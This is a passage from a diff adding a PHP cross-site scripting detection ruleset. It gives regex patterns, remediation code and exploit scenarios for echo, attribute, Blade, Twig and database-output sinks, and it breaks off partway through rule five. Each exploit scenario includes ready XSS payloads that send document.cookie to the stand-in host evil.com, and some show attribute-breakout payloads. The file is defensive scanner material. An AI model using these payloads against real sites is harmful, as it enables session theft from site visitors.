@@ -1,0 +1,918 @@
+# ============================================================================
+# XSS Detection Rules - PHP
+# Ruleset Version: 3.0.0
+# Last Updated: 2025-01-15
+# Category: Cross-Site Scripting (CWE-79)
+# Language: PHP (Laravel, WordPress, Symfony, vanilla PHP)
+# ============================================================================
+
+rules:
+
+  # --------------------------------------------------------------------------
+  # XSS-PHP-001: Echo/Print Without htmlspecialchars
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-PHP-001
+    title: Echo/Print Output Without htmlspecialchars Encoding
+    description: >
+      Detects PHP echo and print statements that output user-controlled data
+      ($_GET, $_POST, $_REQUEST, $_COOKIE, $_SERVER) directly into HTML context
+      without htmlspecialchars(), htmlentities(), or equivalent encoding. This is
+      PHP's most common XSS vulnerability pattern and remains the primary vector
+      in legacy PHP applications and WordPress plugins.
+    language: php
+    category: xss
+    severity: High
+    confidence: 0.93
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, echo, php, htmlspecialchars, superglobals]
+    detection_layer: 1
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: 'echo\s+\$_(?:GET|POST|REQUEST|COOKIE)\s*\[\s*[''"][^''"]+[''"]'
+        description: "echo directly outputting superglobal variable"
+      - type: regex
+        pattern: 'echo\s+[''"]<[^>]*[''"].*?\.\s*\$_(?:GET|POST|REQUEST|COOKIE)\s*\['
+        description: "echo concatenating HTML with superglobal"
+      - type: regex
+        pattern: 'echo\s+[''"]<[^>]*\$\{?\$_(?:GET|POST|REQUEST|COOKIE)\['
+        description: "echo with inline superglobal variable in HTML string"
+      - type: regex
+        pattern: '(?:echo|print)\s+\$(?:user|data|input|content|name|title|body|message|comment|value|result)\b(?!\s*\))'
+        description: "echo/print with user-like variable name without encoding"
+      - type: regex
+        pattern: '<\?=\s*\$_(?:GET|POST|REQUEST|COOKIE)\s*\[\s*[''"][^''"]+[''"]\s*\]'
+        description: "PHP short echo tag outputting superglobal"
+      - type: regex
+        pattern: 'echo\s+\$_SERVER\s*\[\s*[''"](?:PHP_SELF|REQUEST_URI|QUERY_STRING|HTTP_REFERER|HTTP_USER_AGENT)[''"]'
+        description: "echo outputting exploitable $_SERVER variable"
+      - type: regex
+        pattern: 'printf?\s*\(\s*[''"]<[^>]*%s[^>]*>[''"]\s*,\s*\$_(?:GET|POST|REQUEST)\['
+        description: "printf with HTML format string and superglobal value"
+    anti_patterns:
+      - 'htmlspecialchars'
+      - 'htmlentities'
+      - 'strip_tags'
+      - 'esc_html'
+      - 'esc_attr'
+      - 'e()'
+      - 'escape'
+      - 'purifier'
+      - 'HTMLPurifier'
+      - 'filter_var'
+      - 'FILTER_SANITIZE'
+      - 'wp_kses'
+      - 'test'
+      - 'mock'
+      - 'phpunit'
+    bypass_variants:
+      - description: "Variable assigned from superglobal then echoed"
+        pattern: '\$\w+\s*=\s*\$_(?:GET|POST|REQUEST)\[.*?\][^;]*;[\s\S]{0,200}echo\s+\$\w+'
+      - description: "strip_tags without encoding (attributes still injectable)"
+        pattern: 'echo\s+strip_tags\s*\(\s*\$_(?:GET|POST|REQUEST)'
+      - description: "htmlspecialchars without ENT_QUOTES (attribute injection possible)"
+        pattern: 'htmlspecialchars\s*\(\s*\$\w+\s*(?:\)|,\s*ENT_COMPAT)'
+    evasion_indicators:
+      - "Superglobal assigned to local variable then echoed"
+      - "strip_tags used instead of htmlspecialchars (attributes still exploitable)"
+      - "htmlspecialchars without ENT_QUOTES flag"
+      - "htmlspecialchars with wrong encoding parameter"
+    encoding_variants:
+      - type: "direct_echo"
+        pattern: 'echo\s+\$_(?:GET|POST|REQUEST)\['
+      - type: "short_tag"
+        pattern: '<\?=\s*\$_(?:GET|POST|REQUEST)\['
+      - type: "printf"
+        pattern: 'printf?\s*\(.*\$_(?:GET|POST|REQUEST)\['
+    multi_function_chain_patterns:
+      - "$_GET['name'] -> echo '<p>' . $name . '</p>' -> reflected XSS"
+      - "$_POST['comment'] -> $db->insert() -> echo $row['comment'] -> stored XSS"
+      - "$_SERVER['PHP_SELF'] -> <form action='<?= $_SERVER[\"PHP_SELF\"] ?>'> -> self-XSS"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Direct echo of superglobals enables trivial XSS"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "$_GET"
+        sink: "echo"
+        through: "direct_output"
+      - source: "$_POST"
+        sink: "echo"
+        through: "string_concatenation"
+      - source: "$_SERVER['PHP_SELF']"
+        sink: "form_action"
+        through: "short_echo_tag"
+    impact: |
+      Direct output of user input without encoding enables XSS:
+      - $_GET/$_POST reflected directly in HTML
+      - $_SERVER['PHP_SELF'] exploitable in form actions
+      - Cookie values rendered without encoding
+      - Affects millions of legacy PHP applications
+    remediation: |
+      ```php
+      // SECURE: Always use htmlspecialchars with ENT_QUOTES
+      echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
+
+      // SECURE: Short echo tag with encoding
+      <?= htmlspecialchars($variable, ENT_QUOTES, 'UTF-8') ?>
+
+      // SECURE: WordPress
+      echo esc_html($user_input);
+      echo esc_attr($attribute_value);
+      echo esc_url($url_value);
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://www.php.net/manual/en/function.htmlspecialchars.php"
+    context_awareness:
+      surrounding_context_patterns: ['echo', 'print', '<?=', '$_GET', '$_POST', '$_REQUEST']
+      taint_source_indicators: ['$_GET', '$_POST', '$_REQUEST', '$_COOKIE', '$_SERVER']
+      taint_sink_indicators: ['echo', 'print', '<?=', 'printf']
+      sanitization_patterns: ['htmlspecialchars', 'htmlentities', 'esc_html', 'esc_attr', 'filter_var']
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (1 + superglobal_directness)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        PHP page echoing GET parameter:
+        <?php echo "Hello " . $_GET['name']; ?>
+        URL: https://target.com/page.php?name=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
+      example_payload: "<script>fetch('https://evil.com?c='+document.cookie)</script>"
+      attacker_objective: "Inject script via echoed superglobal variable"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-PHP-002, XSS-PHP-003]
+
+  # --------------------------------------------------------------------------
+  # XSS-PHP-002: $_GET/$_POST in HTML Attributes
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-PHP-002
+    title: User Input in HTML Attributes Without Encoding
+    description: >
+      Detects PHP patterns where user-controlled data is placed inside HTML
+      attributes (value, href, src, style, event handlers) without proper
+      attribute-context encoding. Attribute injection is the second most common
+      PHP XSS vector after direct echo and enables script execution through event
+      handlers and javascript: URIs even when tag injection is prevented.
+    language: php
+    category: xss
+    severity: High
+    confidence: 0.91
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, attributes, php, html-injection, event-handler]
+    detection_layer: 1
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: '(?:value|placeholder|title|alt)\s*=\s*[''"]?\s*<\?(?:=|php\s+echo)\s+\$(?:_GET|_POST|_REQUEST|_COOKIE)\['
+        description: "HTML attribute value from superglobal"
+      - type: regex
+        pattern: 'href\s*=\s*[''"]?\s*<\?(?:=|php\s+echo)\s+\$(?:_GET|_POST|_REQUEST|url|link|redirect)'
+        description: "href attribute from user-controlled variable"
+      - type: regex
+        pattern: 'src\s*=\s*[''"]?\s*<\?(?:=|php\s+echo)\s+\$(?:_GET|_POST|_REQUEST|url|image|path)'
+        description: "src attribute from user-controlled variable"
+      - type: regex
+        pattern: 'style\s*=\s*[''"]?\s*<\?(?:=|php\s+echo)\s+\$(?:_GET|_POST|_REQUEST|style|css|color)'
+        description: "style attribute from user input"
+      - type: regex
+        pattern: 'on\w+\s*=\s*[''"]?\s*<\?(?:=|php\s+echo)\s+\$(?:_GET|_POST|_REQUEST|data|input|action)'
+        description: "Event handler attribute from user input"
+      - type: regex
+        pattern: '<input[^>]*value\s*=\s*[''"]?\s*\$(?:_GET|_POST|_REQUEST|data|input|value)\['
+        description: "Input value directly from superglobal without encoding"
+    anti_patterns:
+      - 'htmlspecialchars'
+      - 'htmlentities'
+      - 'esc_attr'
+      - 'esc_url'
+      - 'filter_var'
+      - 'FILTER_SANITIZE_URL'
+      - 'urlencode'
+      - 'ENT_QUOTES'
+      - 'test'
+      - 'mock'
+      - 'phpunit'
+      - 'fixture'
+      - 'HTMLPurifier'
+      - 'strip_tags'
+    bypass_variants:
+      - description: "Breaking out of attribute with unquoted value"
+        pattern: '(?:value|src|href)\s*=\s*<\?(?:=|php)\s+\$\w+(?!\s*[''"])'
+      - description: "htmlspecialchars in value but not in attribute name context"
+        pattern: '<\w+\s+<\?=\s*\$\w+\s*\?>\s*=\s*[''"][^/]*[''"]'
+      - description: "URL user input without scheme validation"
+        pattern: 'href\s*=\s*[''"]<\?=\s*htmlspecialchars\s*\(\s*\$\w+(?!\s*,\s*ENT_QUOTES)'
+    evasion_indicators:
+      - "Attribute value without quotes enables tag-breaking"
+      - "htmlspecialchars without ENT_QUOTES in attribute context"
+      - "href set from user input without protocol validation"
+      - "Event handler attributes with user data"
+    encoding_variants:
+      - type: "value_attribute"
+        pattern: 'value\s*=\s*[''"]?\$(?:_GET|_POST|_REQUEST)\['
+      - type: "href_attribute"
+        pattern: 'href\s*=\s*[''"]?\$(?:_GET|_POST|url)\b'
+      - type: "event_handler"
+        pattern: 'on\w+\s*=\s*[''"]?\$(?:_GET|_POST|data)\b'
+    multi_function_chain_patterns:
+      - "$_GET['q'] -> <input value='<?= $q ?>'> -> attribute injection"
+      - "$_GET['url'] -> <a href='<?= $url ?>'> -> javascript: URI injection"
+      - "$_POST['css'] -> <div style='<?= $css ?>'> -> CSS injection"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Attribute injection enables event handler XSS and javascript: URIs"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "$_GET"
+        sink: "html_attribute"
+        through: "inline_php"
+      - source: "$_POST"
+        sink: "event_handler_attribute"
+        through: "echo_statement"
+      - source: "$_REQUEST"
+        sink: "href_attribute"
+        through: "variable_assignment"
+    impact: |
+      User input in HTML attributes enables context-specific XSS:
+      - Attribute value breakout when quotes missing
+      - javascript: URI in href attributes
+      - Event handler injection (onmouseover, onfocus, etc.)
+      - CSS injection for data exfiltration
+    remediation: |
+      ```php
+      // SECURE: Use htmlspecialchars with ENT_QUOTES for ALL attributes
+      <input value="<?= htmlspecialchars($value, ENT_QUOTES, 'UTF-8') ?>">
+
+      // SECURE: For URLs, validate scheme then encode
+      $url = filter_var($url, FILTER_SANITIZE_URL);
+      if (parse_url($url, PHP_URL_SCHEME) === 'https') {
+          echo '<a href="' . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . '">';
+      }
+
+      // WordPress
+      <input value="<?= esc_attr($value) ?>">
+      <a href="<?= esc_url($url) ?>">
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-2-attribute-encode-before-inserting-untrusted-data-into-html-common-attributes"
+    context_awareness:
+      surrounding_context_patterns: ['value=', 'href=', 'src=', 'style=', 'on', '<input', '<a', '<img']
+      taint_source_indicators: ['$_GET', '$_POST', '$_REQUEST', '$_COOKIE']
+      taint_sink_indicators: ['value=', 'href=', 'src=', 'style=', 'onclick=', 'onload=']
+      sanitization_patterns: ['htmlspecialchars.*ENT_QUOTES', 'esc_attr', 'esc_url', 'filter_var']
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (1 + attribute_context_risk)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        Search form reflecting query in input value:
+        <input value="<?= $_GET['q'] ?>">
+        Payload: " onfocus=alert(document.cookie) autofocus="
+        Result: <input value="" onfocus=alert(document.cookie) autofocus="">
+      example_payload: "\" onfocus=fetch('https://evil.com?c='+document.cookie) autofocus=\""
+      attacker_objective: "Break out of HTML attribute to inject event handlers"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-PHP-001, XSS-PHP-006]
+
+  # --------------------------------------------------------------------------
+  # XSS-PHP-003: Laravel Blade Unescaped Output
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-PHP-003
+    title: Laravel Blade Unescaped Output with {!! !!}
+    description: >
+      Detects usage of Laravel Blade's unescaped output syntax {!! !!} with
+      user-controlled data. Blade's {{ }} syntax auto-escapes via htmlspecialchars,
+      but {!! !!} renders raw HTML. When used with user input, database content,
+      or request data, it creates stored or reflected XSS vulnerabilities.
+    language: php
+    category: xss
+    severity: High
+    confidence: 0.92
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, laravel, blade, unescaped, template, php]
+    detection_layer: 1
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: '\{!!\s*\$(?:request|input|user|data|content|post|comment|message|body|html|bio|description)\b'
+        description: "Blade unescaped output of user-controlled variable"
+      - type: regex
+        pattern: '\{!!\s*\$(?:\w+)->(?:content|body|html|bio|description|comment|message|name|title)\b'
+        description: "Blade unescaped output of model property"
+      - type: regex
+        pattern: '\{!!\s*(?:request|Request::|\$request->)\s*(?:->|\().*?(?:get|input|query|post)\s*\('
+        description: "Blade unescaped output of request input"
+      - type: regex
+        pattern: '\{!!\s*(?:old|session|cookie)\s*\('
+        description: "Blade unescaped output of old input, session, or cookie data"
+      - type: regex
+        pattern: '\{!!\s*(?:Str::|\$\w+->)(?:markdown|toHtml|render)\s*\('
+        description: "Blade unescaped output of rendered markdown or HTML"
+      - type: regex
+        pattern: '\{!!\s*nl2br\s*\(\s*(?:e\s*\()?\s*\$(?:content|body|message|comment|text)'
+        description: "Blade unescaped nl2br possibly without inner escaping"
+    anti_patterns:
+      - 'clean'
+      - 'purify'
+      - 'HTMLPurifier'
+      - 'Purifier::clean'
+      - 'strip_tags'
+      - 'e('
+      - 'htmlspecialchars'
+      - 'sanitize'
+      - '\{\{'
+      - 'test'
+      - 'mock'
+      - 'factory'
+      - 'phpunit'
+      - 'dusk'
+    bypass_variants:
+      - description: "Blade @php directive echoing raw HTML"
+        pattern: '@php\s+echo\s+\$(?:content|body|html|user|data)'
+      - description: "Blade component slot with raw content"
+        pattern: '\{\{\s*\$slot\s*\}\}[^}]*\{!!\s*\$'
+      - description: "Blade custom directive outputting raw HTML"
+        pattern: 'Blade::directive\s*\([^)]*function[^}]*return\s+[''"]<\?php\s+echo'
+    evasion_indicators:
+      - "@php directive used to bypass Blade escaping"
+      - "Custom Blade directive rendering raw HTML"
+      - "Blade component slots passing raw content"
+      - "{!! !!} used with model fields from database"
+    encoding_variants:
+      - type: "raw_output"
+        pattern: '\{!!\s*\$\w+\s*!!\}'
+      - type: "method_call"
+        pattern: '\{!!\s*\$\w+->[\w(]+.*?!!\}'
+      - type: "helper_function"
+        pattern: '\{!!\s*\w+\s*\(.*?\).*?!!\}'
+    multi_function_chain_patterns:
+      - "User.bio from DB -> {!! $user->bio !!} -> stored XSS"
+      - "Request::input('content') -> {!! $content !!} -> reflected XSS"
+      - "Markdown::parse($input) -> {!! $html !!} -> markdown XSS"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Blade {!! !!} bypasses Laravel's auto-escaping for XSS"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "database_model"
+        sink: "blade_raw_output"
+        through: "model_property"
+      - source: "request_input"
+        sink: "blade_raw_output"
+        through: "controller_variable"
+      - source: "user_content"
+        sink: "blade_raw_output"
+        through: "markdown_renderer"
+    impact: |
+      Blade {!! !!} with user data bypasses Laravel's XSS protection:
+      - Stored XSS from database content fields
+      - Reflected XSS from request inputs
+      - Markdown injection with embedded HTML/scripts
+      - Affects Laravel's template-level security guarantee
+    remediation: |
+      ```blade
+      {{-- SECURE: Use {{ }} for auto-escaped output (default) --}}
+      {{ $user->name }}
+
+      {{-- SECURE: If HTML is needed, sanitize first --}}
+      {!! clean($user->bio) !!}
+      {{-- Requires mews/purifier package --}}
+      {!! Purifier::clean($content) !!}
+
+      {{-- INSECURE: Never use {!! !!} with user input --}}
+      {{-- {!! $request->input('content') !!} --}}
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://laravel.com/docs/blade#displaying-data"
+    context_awareness:
+      surrounding_context_patterns: ['{!!', '!!}', '@extends', '@section', 'blade.php']
+      taint_source_indicators: ['$request', '$user', '$post', '$comment', 'old(', 'request(']
+      taint_sink_indicators: ['{!!', 'echo', '@php echo']
+      sanitization_patterns: ['{{', 'Purifier::clean', 'e(', 'htmlspecialchars', 'clean(']
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (1 + data_source_persistence)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        Laravel profile page rendering user bio:
+        {!! $user->bio !!}
+        Attacker sets bio to: <img src=x onerror="fetch('/api/user/'+document.cookie)">
+        Every visitor to attacker's profile executes the script.
+      example_payload: "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>"
+      attacker_objective: "Inject stored XSS via Blade unescaped output syntax"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-PHP-001, XSS-PHP-004]
+
+  # --------------------------------------------------------------------------
+  # XSS-PHP-004: Twig Raw Filter on User Data
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-PHP-004
+    title: Twig |raw Filter on User-Controlled Data
+    description: >
+      Detects usage of Twig's |raw filter on user-controlled variables. Twig
+      auto-escapes output by default, but the |raw filter disables escaping.
+      When applied to user input, database content, or request data, it creates
+      XSS vulnerabilities in Symfony and other Twig-based PHP applications.
+    language: php
+    category: xss
+    severity: High
+    confidence: 0.91
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, twig, symfony, raw-filter, template, php]
+    detection_layer: 1
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: '\{\{\s*(?:user|content|data|body|html|message|comment|post|bio|description|input|param)\w*\s*\|\s*raw\s*\}\}'
+        description: "Twig raw filter on user-controlled variable"
+      - type: regex
+        pattern: '\{\{\s*\w+\.(?:content|body|html|bio|description|comment|message|name|text)\s*\|\s*raw\s*\}\}'
+        description: "Twig raw filter on object content property"
+      - type: regex
+        pattern: '\{\{\s*app\.request\.(?:get|query|request|cookies)\s*\(\s*[''"][^''"]+[''"]\s*\)\s*\|\s*raw\s*\}\}'
+        description: "Twig raw filter on Symfony request data"
+      - type: regex
+        pattern: '\{\{\s*(?:include|render|source)\s*\(\s*[^)]*\)\s*\|\s*raw\s*\}\}'
+        description: "Twig raw filter on included/rendered content"
+      - type: regex
+        pattern: '\{\%\s*autoescape\s+false\s*\%\}'
+        description: "Twig autoescape disabled for block"
+      - type: regex
+        pattern: '\{\{\s*\w+\s*\|\s*raw\s*\|\s*(?!striptags|escape)'
+        description: "Twig raw filter without subsequent sanitization filter"
+    anti_patterns:
+      - 'striptags'
+      - 'escape'
+      - '|e'
+      - 'purify'
+      - 'sanitize'
+      - 'HTMLPurifier'
+      - 'twig.html_sanitizer'
+      - 'test'
+      - 'mock'
+      - 'fixture'
+      - 'phpunit'
+      - 'KernelTestCase'
+      - 'WebTestCase'
+      - 'autoescape.*html'
+    bypass_variants:
+      - description: "Twig filter chain with raw after other filters"
+        pattern: '\|\s*\w+\s*\|\s*raw\s*\}\}'
+      - description: "Twig set tag storing raw content"
+        pattern: '\{\%\s*set\s+\w+\s*\%\}.*?\{\%\s*endset\s*\%\}.*?\{\{\s*\w+\s*\|\s*raw'
+      - description: "Custom Twig extension disabling auto-escaping"
+        pattern: 'getFilters\s*\(\s*\)[^}]*is_safe.*?html'
+    evasion_indicators:
+      - "autoescape false for entire block"
+      - "Custom Twig filter marked as is_safe html"
+      - "raw filter applied after non-sanitizing filters"
+      - "Twig set tag used to store and render raw content"
+    encoding_variants:
+      - type: "raw_filter"
+        pattern: '\|\s*raw\s*\}\}'
+      - type: "autoescape_off"
+        pattern: 'autoescape\s+false'
+      - type: "is_safe_html"
+        pattern: 'is_safe.*?html'
+    multi_function_chain_patterns:
+      - "entity.content from DB -> {{ entity.content|raw }} -> stored XSS"
+      - "app.request.get('q') -> {{ query|raw }} -> reflected XSS"
+      - "markdown_to_html(input) -> {{ html|raw }} -> markdown XSS"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Twig |raw filter disables auto-escaping for XSS"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "doctrine_entity"
+        sink: "twig_raw_output"
+        through: "entity_property"
+      - source: "request_query"
+        sink: "twig_raw_output"
+        through: "controller_variable"
+      - source: "database_content"
+        sink: "twig_raw_output"
+        through: "repository_query"
+    impact: |
+      Twig |raw filter removes auto-escaping protection:
+      - Stored XSS from database fields rendered with |raw
+      - Reflected XSS from request parameters with |raw
+      - autoescape false disabling protection for blocks
+      - Custom extensions with is_safe bypass
+    remediation: |
+      ```twig
+      {# SECURE: Default Twig auto-escaping (no |raw filter) #}
+      {{ user.name }}
+
+      {# SECURE: If HTML rendering needed, sanitize first #}
+      {{ user.bio|sanitize }}
+
+      {# Symfony HTML Sanitizer #}
+      {{ user.bio|sanitize_html('default') }}
+
+      {# NEVER use |raw with user-controlled data #}
+      {# {{ user.bio|raw }}  <- INSECURE #}
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://twig.symfony.com/doc/3.x/tags/autoescape.html"
+      - "https://symfony.com/doc/current/html_sanitizer.html"
+    context_awareness:
+      surrounding_context_patterns: ['|raw', 'autoescape', '{{ ', 'twig', 'symfony']
+      taint_source_indicators: ['app.request', 'entity.', 'form.', 'user.']
+      taint_sink_indicators: ['|raw', 'autoescape false', 'is_safe']
+      sanitization_patterns: ['|escape', '|e', '|striptags', 'sanitize_html', 'HTMLPurifier']
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (1 + template_context_risk)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        Symfony blog rendering post body with |raw:
+        {{ post.body|raw }}
+        Attacker creates post with body: <script>fetch('https://evil.com?c='+document.cookie)</script>
+        All readers of the post execute attacker's script.
+      example_payload: "<svg onload=fetch('https://evil.com?c='+document.cookie)>"
+      attacker_objective: "Exploit Twig |raw filter for stored XSS in Symfony"
+    confidence_factors:
+      pattern_strength: high
+      context_match: high
+      proximity_to_user_input: high
+      sanitization_absence: high
+    metadata:
+      rule_version: '3.0.0'
+      last_reviewed: '2025-01-15'
+      rule_maturity_level: hardened
+      detection_complexity: contextual
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules: [XSS-PHP-003, XSS-PHP-001]
+
+  # --------------------------------------------------------------------------
+  # XSS-PHP-005: Database Query Result Echoed Without Encoding
+  # --------------------------------------------------------------------------
+  - rule_id: XSS-PHP-005
+    title: Database Query Result Echoed Without Output Encoding
+    description: >
+      Detects patterns where PHP database query results (from PDO, MySQLi, or
+      WordPress $wpdb) are echoed or rendered in HTML templates without output
+      encoding. This is the primary stored XSS pattern where attacker-controlled
+      data persisted in the database is rendered to other users without sanitization.
+    language: php
+    category: xss
+    severity: High
+    confidence: 0.89
+    cwe: CWE-79
+    owasp: A03:2021-Injection
+    tags: [xss, stored-xss, database, pdo, mysqli, wordpress, php]
+    detection_layer: 2
+    attack_surface_type: web
+    patterns:
+      - type: regex
+        pattern: '\$(?:row|result|record|data)\s*\[\s*[''"][^''"]+[''"].*?(?:echo|print|<?=)'
+        description: "Database row field directly echoed"
+      - type: regex
+        pattern: 'echo\s+\$(?:row|result|record|data)\s*\[\s*[''"](?:name|title|content|body|comment|message|bio|description|email|username)[''"]'
+        description: "echo of database row content field"
+      - type: regex
+        pattern: 'fetch\w*\s*\(\s*(?:PDO::\w+)?\s*\)\s*;[\s\S]{0,100}echo\s+\$\w+\['
+        description: "PDO fetch result echoed without encoding"
+      - type: regex
+        pattern: '\$wpdb->get_(?:results?|var|col|row)\s*\([^)]+\)[\s\S]{0,150}echo\s+\$\w+\b'
+        description: "WordPress $wpdb result echoed directly"
+      - type: regex
+        pattern: 'mysqli_fetch_\w+\s*\([^)]+\)[\s\S]{0,100}echo\s+\$\w+\['
+        description: "MySQLi fetch result echoed without encoding"
+      - type: regex
+        pattern: 'while\s*\(\s*\$\w+\s*=\s*\$\w+->fetch\w*\s*\([^)]*\)\s*\)\s*\{[^}]*echo\s+\$\w+\['
+        description: "Database fetch loop with direct echo"
+    anti_patterns:
+      - 'htmlspecialchars'
+      - 'htmlentities'
+      - 'esc_html'
+      - 'esc_attr'
+      - 'wp_kses'
+      - 'strip_tags'
+      - 'filter_var'
+      - 'HTMLPurifier'
+      - 'sanitize'
+      - 'escape'
+      - 'test'
+      - 'mock'
+      - 'phpunit'
+      - 'fixture'
+    bypass_variants:
+      - description: "ORM result rendered in template without escaping"
+        pattern: '\$\w+\s*=\s*\w+::find\s*\([^)]+\)[\s\S]{0,200}echo\s+\$\w+->(?:content|body|html|message)'
+      - description: "Database results in foreach loop directly rendered"
+        pattern: 'foreach\s*\(\s*\$\w+\s+as\s+\$\w+\s*\)\s*\{[^}]*echo\s+[''"]<[^>]*\$\w+\['
+      - description: "Cached database content rendered without re-encoding"
+        pattern: '(?:Cache|cache)::(?:get|remember)\s*\([^)]+\)[\s\S]{0,200}echo\s+\$(?:cached|data)\['
+    evasion_indicators:
+      - "ORM results rendered without escaping"
+      - "Database content in iteration loop directly echoed"
+      - "Cached database content rendered without encoding"
+      - "Database HTML field treated as safe"
+    encoding_variants:
+      - type: "pdo_fetch"
+        pattern: '->fetch\w*\s*\([^)]*\)[\s\S]{0,100}echo\s+\$\w+\['
+      - type: "mysqli_fetch"
+        pattern: 'mysqli_fetch_\w+[\s\S]{0,100}echo\s+\$\w+\['
+      - type: "wpdb_get"
+        pattern: '\$wpdb->get_\w+[\s\S]{0,100}echo\s+\$\w+\b'
+    multi_function_chain_patterns:
+      - "PDO::query() -> fetch() -> echo $row['content'] -> stored XSS"
+      - "$wpdb->get_results() -> foreach -> echo $row->comment -> stored XSS"
+      - "Eloquent::all() -> @foreach -> {!! $item->body !!} -> stored XSS"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Stored XSS from database affects all viewers of the content"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "database_column"
+        sink: "echo_statement"
+        through: "fetch_result"
+      - source: "wpdb_query"
+        sink: "template_output"
+        through: "result_array"
+      - source: "eloquent_model"
+        sink: "blade_template"
+        through: "model_property"
+    impact: |
+      Database content rendered without encoding enables stored XSS:
+      - Attacker stores payload via form/API -> All viewers affected
+      - WordPress comment/post XSS via $wpdb
+      - PDO/MySQLi result fields rendered in HTML
+      - Persistent across sessions and user sessions
+    remediation: |
+      ```php
+      // SECURE: Always encode database output
+      while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
+          echo htmlspecialchars($row['name'], ENT_QUOTES, 'UTF-8');
+      }
+
+      // WordPress
+      echo esc_html($wpdb->get_var("SELECT name FROM users WHERE id = %d", $id));
+
+      // Laravel Eloquent (use {{ }} in Blade, not {!! !!})
+      // {{ $post->title }}  <- auto-escaped
+      ```
+    references:
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://www.php.net/manual/en/pdo.prepared-statements.php"
+    context_awareness:
+      surrounding_context_patterns: ['PDO', 'mysqli', '$wpdb', 'fetch', 'query', 'SELECT']
+      taint_source_indicators: ['fetch(', 'fetchAll(', 'get_results', 'get_var', 'get_row']
+      taint_sink_indicators: ['echo', 'print', '<?=', 'printf']
+      sanitization_patterns: ['htmlspecialchars', 'esc_html', 'esc_attr', 'filter_var', 'strip_tags']
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (1 + affected_user_scope)"
+      exploitability_score: High
+    exploit_scenario:
+      attack_example: |
+        Comment system storing and displaying user input:
+        $stmt = $pdo->query("SELECT comment FROM comments WHERE post_id = $id");
+        while ($row = $stmt->fetch()) { echo '<p>' . $row['comment'] . '</p>'; }
+        Attacker submits: <script>new Image().src='https://evil.com/?c='+document.cookie</script>
+      example_payload: "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
+      attacker_objective: "Persist XSS payload in database for all content viewers"
